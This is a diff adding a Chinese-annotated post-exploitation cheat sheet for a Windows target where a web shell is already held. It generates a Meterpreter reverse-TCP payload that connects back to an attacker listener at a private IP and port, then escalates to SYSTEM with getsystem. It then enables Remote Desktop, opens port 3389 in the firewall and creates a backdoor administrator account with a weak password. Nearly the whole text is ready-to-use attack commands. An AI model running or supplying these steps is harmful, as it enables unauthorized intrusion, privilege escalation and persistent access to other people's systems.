@@ -1,0 +1,47 @@
+环境：已经获取目标机器的 web shell
+
+
+
+利用 Windows 内核漏洞提权
+
+	msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.184.150 LPORT=8080 -f exe -o payload-64.exe				（生成木马程序）
+	
+	msfconsole																										（进入 msf）
+	use exploit/multi/handler																							（使用 multi/handler 漏洞利用模块）
+	set PAYLOAD windows/x64/meterpreter/reverse_tcp																	（设置用于攻击的载荷类型）
+	set LHOST 192.168.184.150																							（监听IP）
+	set LPORT 8080																									（监听端口）
+	exploit	/	run																									（开始监听）
+
+	getuid																											（显示当前用户 id）
+
+	use priv																											（使用提权模块）
+	getsystem																										（执行提权）
+
+	getuid
+
+	shell																											（进入 Windows cmd 命令行，exit 退出 cmd）
+
+	wmic RDTOGGLE WHERE ServerName='%COMPUTERNAME%' call SetAllowTSConnections 1									（开启远程桌面功能）
+	&
+	run post/windows/manage/enable_rdp
+
+	netsh advfirewall firewall set rule name="远程桌面 - 用户模式(TCP-In)" dir=in new enable=yes localport=3389					（防火墙开启 3389 端口）
+	&
+	netsh advfirewall firewall add rule name="网络发现(SSDD-In)" dir=in action=allow protocol=TCP localport=3389				（新建规则）
+
+	net user john 123456 /add																							（新建用户 john 密码为 123456）
+	net localgroup administrators john /add																				（添加 john 到 administrators 组）
+	net localgroup "Remote Desktop Users" john /add																	（添加 john 到 远程桌面用户组）
+
+	chcp 65001																										（解决乱码问题，但若命令中有中文，会导致命令执行失败并退出）
+
+
+
+
+
+
+
+
+
+
